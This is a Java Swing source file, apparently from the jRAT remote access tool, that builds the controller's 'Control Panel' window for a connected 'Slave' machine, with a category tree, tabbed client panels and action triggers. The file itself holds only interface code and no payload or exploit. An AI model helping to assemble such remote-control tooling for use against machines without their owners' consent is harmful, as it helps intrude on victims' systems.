package jrat.controller.ui.frames;

import jrat.api.ClientEventListener;
import jrat.api.ui.*;
import jrat.controller.Slave;
import jrat.controller.ui.renderers.DefaultJTreeCellRenderer;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import java.awt.*;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@SuppressWarnings("serial")
public class FrameControlPanel extends BaseFrame implements TreeSelectionListener {

    /**
     * Contains the category treenodes
     */
    private Map<ControlPanel.Category, DefaultMutableTreeNode> categoryNodes = new HashMap<>();
    private Map<String, ClientPanel> panelInstances = new HashMap<>();

    /**
     * All control panel items from modules sent to client
     */
    private List<ControlPanelItem> loadedItems = new ArrayList<>();

    private JTree tree;

	public static final Map<Slave, FrameControlPanel> instances = new HashMap<>();

	public HashMap<String, JPanel> panels = new HashMap<>();
	private JTabbedPane tabbedPane;

	private ControlPanelTreeRenderer treeRenderer;

	public JTree getTree() {
		return tree;
	}

	public FrameControlPanel(Slave s) {
		super(s);
		
		this.loadedItems = s.getControlPanelItems();

		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameControlPanel.class.getResource("/controlpanel.png")));
		setTitle("Control Panel");
		final Slave sl = slave;
		instances.put(slave, this);

		setResizable(false);
		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		setBounds(100, 100, 807, 414);
        JPanel contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

        JPanel panel = new JPanel();
		panel.setSize(600, 350);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 175, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(panel, GroupLayout.PREFERRED_SIZE, 607, GroupLayout.PREFERRED_SIZE).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false).addComponent(scrollPane, Alignment.LEADING).addComponent(panel, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 364, Short.MAX_VALUE)).addContainerGap(12, Short.MAX_VALUE)));

		tree = new JTree();
		tree.setShowsRootHandles(true);
		tree.addTreeSelectionListener(this);
		tree.setRootVisible(false);
		treeRenderer = new ControlPanelTreeRenderer();
		tree.setCellRenderer(treeRenderer);
		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Control Panel") {
			{
				addNodes(this);
			}
		}));
		scrollPane.setViewportView(tree);
		contentPane.setLayout(gl_contentPane);

		panel.setLayout(new BorderLayout(0, 0));

		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		panel.add(tabbedPane, BorderLayout.CENTER);

		addTabs("System");
	}

    /**
     * Adds all tabs under a specific category
     * @param currentLabel category text (current treenode text)
     */
	public void addTabs(String currentLabel) {
        clearPanels();

        for (ControlPanelItem item : loadedItems) {
            if (item.category.text.equals(currentLabel) && item instanceof ControlPanelTab) {
                ClientPanel panel = ((ControlPanelTab) item).createPanel(slave);
                panelInstances.put(item.text, panel);
                tabbedPane.addTab(item.text, item.icon, panel);
            }
        }
	}

    /**
     * Builds the tree view
     * @param n master tree node
     */
	public void addNodes(DefaultMutableTreeNode n) {
	    for (ControlPanelItem item : loadedItems) {
	        DefaultMutableTreeNode parent;

	        // if not category node has been created, create it and add it to the parent
            if (!categoryNodes.containsKey(item.category)) {
                categoryNodes.put(item.category, new CategoryTreeNode(item.category));
                n.add(categoryNodes.get(item.category));
            }

            parent = categoryNodes.get(item.category);
            parent.add(getTreeNode(item));
        }
	}

    public void valueChanged(TreeSelectionEvent e) {
        try {
            addTabs(e.getPath().getPath()[1].toString());

            Object clicked = e.getPath().getLastPathComponent();

            if (clicked instanceof ControlPanelTreeNode) {
                ControlPanelTreeNode node = (ControlPanelTreeNode) clicked;

                if (node.item instanceof ControlPanelTab) {
                    ClientPanel p = panelInstances.get(node.item.text);
                    tabbedPane.setSelectedComponent(p);

                    p.opened();
                } else if (node.item instanceof ControlPanelAction) {
                    ClientEventListener listener = (ClientEventListener) node.item.item;
                    listener.emit(getSlave());
                }
            }
        } catch (Exception ex) {

        }
    }
	
	private DefaultMutableTreeNode getTreeNode(ControlPanelItem item) {
		return getTreeNode(item, true);
	}
	
	private DefaultMutableTreeNode getTreeNode(ControlPanelItem item, boolean enabled) {
		if (enabled) {
			return new ControlPanelTreeNode(item);
		} else {
			return null; //new DisabledDefaultMutableTreeNode(s);
		}
	}

    /**
     * Removes all tabs and disposes the client panels
     */
	private void clearPanels() {
	    for (Component c : tabbedPane.getComponents()) {
	        if (c instanceof ClientPanel) {
	            ClientPanel panel = (ClientPanel) c;

	            panel.dispose();
            }
        }

        tabbedPane.removeAll();
    }

	@Override
    public void windowClosing(WindowEvent e) {
	    super.windowClosing(e);

	    clearPanels();
    }

    private class ControlPanelTreeNode extends DefaultMutableTreeNode {

        private ControlPanelItem item;

        public ControlPanelTreeNode(ControlPanelItem item) {
            super(item);

            this.item = item;
        }

        public String toString() {
            return this.item.text;
        }
    }

    private class CategoryTreeNode extends DefaultMutableTreeNode {

        private ControlPanel.Category category;

        public CategoryTreeNode(ControlPanel.Category category) {
            super(category);

            this.category = category;
        }

        public String toString() {
            return this.category.text;
        }
    }

    private class ControlPanelTreeRenderer extends DefaultJTreeCellRenderer {

	    private Font defaultFont;
	    private Font bold;

        public Component getTreeCellRendererComponent(JTree tree, Object value, boolean sel, boolean expanded, boolean leaf, int row, boolean hasFocus) {
            JLabel label = (JLabel) super.getTreeCellRendererComponent(tree, value, sel, expanded, leaf, row, hasFocus);

            if (defaultFont == null) {
                defaultFont = super.getFont();
                bold = new Font(defaultFont.getName(), Font.BOLD, defaultFont.getSize());
            }

            if (value instanceof ControlPanelTreeNode) {
                ControlPanelTreeNode node = (ControlPanelTreeNode) value;

                label.setIcon(node.item.icon);

                label.setFont(defaultFont);
            } else if (value instanceof CategoryTreeNode) {
                CategoryTreeNode node = (CategoryTreeNode) value;
                label.setIcon(node.category.icon);

                label.setFont(bold);
            }

            return label;
        }
    }
}
